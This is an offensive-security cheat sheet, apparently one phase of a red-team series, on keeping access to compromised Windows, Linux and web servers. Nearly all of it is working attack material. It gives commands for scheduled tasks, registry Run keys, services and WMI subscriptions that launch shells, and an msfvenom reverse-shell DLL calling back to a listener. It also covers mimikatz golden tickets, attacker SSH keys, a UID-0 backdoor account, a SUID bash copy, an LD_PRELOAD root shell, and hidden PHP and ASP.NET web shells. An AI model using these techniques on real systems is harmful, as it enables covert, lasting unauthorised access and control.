# 🔒 Phase 5: Persistence

```
  ██████╗ ███████╗██████╗ ███████╗██╗███████╗████████╗███████╗███╗   ██╗ ██████╗███████╗
  ██╔══██╗██╔════╝██╔══██╗██╔════╝██║██╔════╝╚══██╔══╝██╔════╝████╗  ██║██╔════╝██╔════╝
  ██████╔╝█████╗  ██████╔╝███████╗██║███████╗   ██║   █████╗  ██╔██╗ ██║██║     █████╗  
  ██╔═══╝ ██╔══╝  ██╔══██╗╚════██║██║╚════██║   ██║   ██╔══╝  ██║╚██╗██║██║     ██╔══╝  
  ██║     ███████╗██║  ██║███████║██║███████║   ██║   ███████╗██║ ╚████║╚██████╗███████╗
  ╚═╝     ╚══════╝╚═╝  ╚═╝╚══════╝╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝ ╚═════╝╚══════╝
```

**Goal:** Maintain access to the compromised system even after reboots or detection.

---

## 🖥️ Windows Persistence

### Scheduled Tasks
```cmd
# Create scheduled task (runs as SYSTEM)
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru SYSTEM

# With specific user
schtasks /create /tn "Updater" /tr "powershell -ep bypass -w hidden -c IEX(payload)" /sc onlogon /ru username

# On startup
schtasks /create /tn "Maintenance" /tr "C:\temp\beacon.exe" /sc onstart /ru SYSTEM

# Every hour
schtasks /create /tn "Sync" /tr "C:\temp\shell.exe" /sc hourly /mo 1

# List tasks
schtasks /query /fo LIST /v

# Delete task
schtasks /delete /tn "TaskName" /f
```

### Registry Run Keys
```cmd
# HKCU - Current user (no admin needed)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\temp\shell.exe"

# HKLM - All users (admin required)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsService" /t REG_SZ /d "C:\Windows\Temp\beacon.exe"

# RunOnce (executes once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "Setup" /t REG_SZ /d "powershell -c IEX(payload)"

# PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value "C:\temp\shell.exe"
```

### Startup Folder
```cmd
# Current user
copy shell.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"

# All users (admin required)
copy shell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\"

# PowerShell
Copy-Item shell.exe -Destination "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
```

### Services
```cmd
# Create service (admin required)
sc create EvilService binPath= "C:\temp\shell.exe" start= auto
sc start EvilService

# Modify existing service
sc config VulnService binPath= "C:\temp\shell.exe"

# PowerShell
New-Service -Name "WindowsHelper" -BinaryPathName "C:\temp\beacon.exe" -StartupType Automatic
Start-Service WindowsHelper
```

### WMI Event Subscriptions
```powershell
# Create WMI persistence
$FilterArgs = @{
    Name = 'EvilFilter'
    EventNameSpace = 'root\CimV2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour = 12 AND TargetInstance.Minute = 00"
}
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs

$ConsumerArgs = @{
    Name = 'EvilConsumer'
    CommandLineTemplate = 'C:\temp\shell.exe'
}
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs

$BindingArgs = @{
    Filter = $Filter
    Consumer = $Consumer
}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments $BindingArgs
```

### DLL Hijacking / Search Order
```cmd
# Find DLL hijack opportunities
# Place malicious DLL in application directory
# Common targets:
# - Program files without full DLL paths
# - Missing DLLs

# Create malicious DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f dll > evil.dll
```

### COM Hijacking
```powershell
# Find COM objects
reg query "HKCU\Software\Classes\CLSID" /s /f "InprocServer32"

# Create hijack
New-Item -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\CLSID\{CLSID}\InprocServer32" -Name "(Default)" -Value "C:\temp\evil.dll"
```

### Golden/Silver Ticket
```powershell
# Golden ticket - persistent domain admin
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:HASH /ptt

# Silver ticket - persistent service access
mimikatz# kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /target:server.domain.local /service:cifs /rc4:HASH /ptt
```

---

## 🐧 Linux Persistence

### Cron Jobs
```bash
# User crontab
crontab -e
# Add: * * * * * /tmp/shell.sh

# System crontab
echo "* * * * * root /tmp/shell" >> /etc/crontab

# Cron directories
echo "#!/bin/bash\n/tmp/shell" > /etc/cron.hourly/update
chmod +x /etc/cron.hourly/update
```

### SSH Keys
```bash
# Add your public key to authorized_keys
echo "ssh-rsa AAAA...your_key... attacker@kali" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Root access
echo "ssh-rsa AAAA...your_key..." >> /root/.ssh/authorized_keys
```

### Backdoor User
```bash
# Add user with root privileges
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:password" | chpasswd

# Or add to /etc/passwd directly
echo 'backdoor:$1$xyz$hash:0:0::/root:/bin/bash' >> /etc/passwd
```

### SUID Binary
```bash
# Copy bash and set SUID
cp /bin/bash /tmp/.hidden
chmod u+s /tmp/.hidden

# Execute as root
/tmp/.hidden -p
```

### Systemd Service
```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Service

[Service]
Type=simple
ExecStart=/tmp/shell
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor
systemctl start backdoor
```

### bashrc / profile
```bash
# Add to user's bashrc
echo '/tmp/shell &' >> ~/.bashrc

# Add to global profile
echo '/tmp/shell &' >> /etc/profile

# Add to bash_profile
echo '/tmp/shell &' >> ~/.bash_profile
```

### LD_PRELOAD
```bash
# Create malicious shared library
cat > /tmp/evil.c << EOF
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -fPIC -shared -o /tmp/evil.so /tmp/evil.c -nostartfiles

# Add to LD_PRELOAD
echo "/tmp/evil.so" >> /etc/ld.so.preload
```

### Web Shell
```bash
# PHP web shell
echo '<?php system($_GET["cmd"]); ?>' > /var/www/html/.shell.php

# More hidden
echo '<?php if(isset($_GET["c"])){system($_GET["c"]);} ?>' > /var/www/html/wp-includes/.config.php
```

---

## 🌐 Web Persistence

### Web Shell Locations
```bash
# Common web shell locations
/var/www/html/.shell.php
/var/www/html/wp-content/uploads/.shell.php
/var/www/html/images/.shell.jpg.php
C:\inetpub\wwwroot\.shell.aspx
C:\inetpub\wwwroot\App_Data\shell.aspx
```

### ASP.NET Web Shell
```aspx
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.UseShellExecute = false;
    p.Start();
    Response.Write(p.StandardOutput.ReadToEnd());
}
%>
```

---

## 📊 Quick Reference

### Windows Persistence Methods

| Method | Location | Privilege |
|--------|----------|-----------|
| Registry Run | HKCU/HKLM | User/Admin |
| Scheduled Task | Task Scheduler | User/Admin |
| Startup Folder | AppData/ProgramData | User/Admin |
| Service | Services | Admin |
| WMI | WMI Subscription | Admin |
| COM Hijack | HKCU CLSID | User |

### Linux Persistence Methods

| Method | Location | Privilege |
|--------|----------|-----------|
| Cron | /etc/crontab | root |
| SSH Keys | ~/.ssh/authorized_keys | User |
| SUID | Binary with +s | root |
| Systemd | /etc/systemd/system | root |
| bashrc | ~/.bashrc | User |

---

## 🔗 Related Cheatsheets

- [PowerShell](../PowerShell/README.md)
- [Linux Commands](../Linux-Commands/README.md)
- [Metasploit](../Metasploit/README.md)

---

**Previous Phase:** [← 04 - Lateral Movement](./04-Lateral-Movement.md)

**Next Phase:** [06 - Defense Evasion →](./06-Defense-Evasion.md)
